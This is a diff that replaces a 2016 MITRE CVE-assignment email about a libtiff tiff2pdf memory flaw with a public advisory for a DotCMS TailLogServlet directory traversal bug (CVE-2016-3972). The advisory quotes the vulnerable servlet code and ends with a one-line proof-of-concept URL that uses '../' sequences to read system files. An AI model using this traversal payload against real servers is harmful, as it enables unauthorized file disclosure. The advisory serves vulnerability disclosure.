@@ -1,51 +1,172 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/11/19/1
-Message-ID: <5ec374c5124440d5ae0dea13583cddab@imshyb02.MITRE.ORG>
-Date: Fri, 18 Nov 2016 19:00:55 -0500
-From: <cve-assign@...re.org>
-To: <chenqin@...sec.com.cn>
-CC: <cve-assign@...re.org>, <oss-security@...ts.openwall.com>
-Subject: Re: CVE Request: libtiff: Out-of-bounds Write memcpy and less bound check in tiff2pdf
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/04/08/1
+Message-ID: <CAA0JNpTZm42a_6D4TdOb=8H56y7dd-fewOCg3CmCA-a8TN=e8g@mail.gmail.com>
+Date: Fri, 8 Apr 2016 11:07:35 +0800
+From: xiong piaox <yahoo860201@...il.com>
+To: fulldisclosure@...lists.org
+Cc: bugs@...uritytracker.com, bugtraq@...urityfocus.com,  oss-security@...ts.openwall.com
+Subject: [CVE-2016-3972]DotCMS Directory traversal vulnerability
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+Advisory: DotCMS Directory traversal vulnerability
 
-> http://bugzilla.maptools.org/show_bug.cgi?id=2579
-> 
-> tools/tiff2pdf.c: fix read -largely- outsize of buffer in
->        t2p_readwrite_pdf_image_tile(), causing crash, when reading a
->        JPEG compressed image with TIFFTAG_JPEGTABLES length being one.
->        Reported as MSVR 35101 by Axel Souchet and Vishal Chauhan from
->        the MSRC Vulnerabilities & Mitigations team.
+Author: Piaox From Pingan Product Safety Group
 
->> Out-of-bounds Write Caused by memcpy and no bound check.
+Email: xiongyaofu351@...gan.com.cn
 
->> will cause illegal write. An attacker may control the write address and/or
->> value
->> to result in denial-of-service or command execution.
+Affected Version: dotCMS 3.5 Beta(the latest version)
 
-Use CVE-2016-9453.
 
-- -- 
-CVE Assignment Team
-M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
-[ A PGP key is available for encrypted communications at
-  http://cve.mitre.org/cve/request_id.html ]
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
 
-iQIcBAEBCAAGBQJYL5R+AAoJEHb/MwWLVhi2Za4P/ioEFjcWkhT7AqaXUZ+G5dZ3
-M9grgWYnmkBsGwqWD56LCNLjDcD4OexKOeogFMBbJkVFaMnyX4eq/uddNlIq2dne
-9TiSm2+X4HKlbw4qiruUx3HbKsgUvQmMrowfGVA97KanT5bCIa/bt94G3/e1lLwl
-FZJ+qlooyFf8VBpR+3UWROPNSbD/m6DgRLDK0yDBxg0J2pKUJHJAu75Ql5BGXkC3
-70yiP9r5Rz9MkrIrTjzRGBidG/aSlrzaPhDk88bNv7edFwUT2EJfndtLLINV3CNl
-0eLCNX3MDb7jwCzw3DtRUPEmuqcBiAUdY/mU0V1IuO9+ipWJl959ELzdgpsFcJ9C
-4SHCOYS3XHNJeJOaQJ9nJJUmWF6DgK2xhYfwTXeifQgaBdN2h0S8DByTQU14oqVw
-5wJCXbGhWvbPq4NGDVG8ATIkgh+K1zoKn/06C/W4lyEgEc8w17xE2GDFyOglrTYt
-EYQZg5qeES940DU+khUOeSp+YOb/m3UCaUmJd/DKOcOofdoUZUVakLXfBMyKZ9rp
-VRYS8k80wwhM5KZWuiGpCOAVVW+BHFCBYgSmXZ+mA6fVP8fqooUy5G+7mjiMidzl
-uyip79HBywTkawVnAEQS5RHgdNOvVIwS6j8rbQN+M5dTseTPdoifRsbJmKLlWEfl
-u/1E3rv67yYtw4XU/Rr7
-=Np2d
------END PGP SIGNATURE-----
+==========================
+
+Vulnerability Description
+
+Recetly, I found a Directory traversal vulnerability in ‘DotCMS'
+program,  DotCMS is widely used in many companies.
+
+
+
+Vulnerable file is: “com.dotmarketing.servlets.taillog.TailLogServlet.class”
+
+File file = *null*;
+
+    String tailLogLofFolder = *Config*.*getStringProperty*(
+"TAIL_LOG_LOG_FOLDER", "./dotsecure/logs/");
+
+    *try*
+
+    {
+
+      *if* (!tailLogLofFolder.endsWith(File.separator)) {
+
+        tailLogLofFolder = tailLogLofFolder + File.separator;
+
+      }
+
+      file = *new* File(*FileUtil*.*getAbsolutlePath*(tailLogLofFolder +
+fileName));
+
+    }
+
+    *catch* (Exception e)
+
+    {
+
+      *Logger*.*error*(getClass(), "unable to open log file '" +
+tailLogLofFolder + fileName + "' please set the config variable
+TAIL_LOG_LOG_FOLDER correctly");
+
+    }
+
+    *if* ((file == *null*) || (!file.exists()))
+
+    {
+
+      response.sendError(403);
+
+      *AdminLogger*.*log*(*TailLogServlet*.*class*, "service", "Someone
+tried to use the TailLogServlet to display a file not in the logs directory"
+);
+
+      *return*;
+
+    }
+
+    String regex = *Config*.*getStringProperty*("TAIL_LOG_FILE_REGEX");
+
+//WEB-INF/classes/dotmarketing-config.properties:TAIL_LOG_FILE_REGEX=.*\.log$|.*\.out$
+
+    *if* (!*UtilMethods*.*isSet*(regex)) {
+
+      regex = "!.*";
+
+    }
+
+*if* (!Pattern.compile(regex).matcher(fileName).matches()) {
+
+//Only detects whether the file extension .log end,lead ，caused Directory
+traversal vulnerability.
+
+      *return*;
+
+    }
+
+    response.setContentType("text/html;charset=UTF-8");
+
+
+
+    ServletOutputStream out = response.getOutputStream();
+
+
+
+    out.print("<html><head><title>dotCMS Log</title><style
+type='text/css'>@import '/html/css/dot_admin.css';</style><script>var
+working =false;function
+doS(){if(!working){working=true;if(parent.document.getElementById('scrollMe').checked){dh=document.body.scrollHeight;ch=document.body.clientHeight;if(dh>ch){moveme=dh-ch;window.scrollTo(0,moveme);}}working=false;}}</script></head><body
+class='tailerBody'>");
+
+
+
+    out.flush();
+
+
+
+    *Tailer* tailer = *null*;
+
+    *long* startPosition = file.length() - 5000L < 0L ? 0L : file.length()
+- 5000L;
+
+
+
+    *MyTailerListener* listener = *new* MyTailerListener(*null*);
+
+    listener.*handle*("Tailing " + fileName);
+
+    listener.*handle*("----------------------------- ");
+
+    tailer = *new* *Tailer*(file, listener, 1000L);
+
+    tailer.*setStartPosition*(startPosition);
+
+    *MyTailerThread* thread = *new* *MyTailerThread*(tailer);
+
+
+
+    String name = *null*;
+
+    *for* (*int* i = 0; i < 1000; i++)
+
+    {
+
+      name = "LogTailer" + i + ":" + fileName;
+
+      Thread t = *ThreadUtils*.*getThread*(name);
+
+      *if* (t == *null*) {
+
+        *break*;
+
+      }
+
+      *if* (i > 100) {
+
+        *throw* *new* ServletException("Too many Logger threads");
+
+      }
+
+    }
+
+
+
+==========================
+
+POC && EXP
+
+==========================
+
+1. Login
+
+2.
+http://localhost:8080/dotTailLogServlet/?fileName=../../../../../../../../var/log/system.log
+
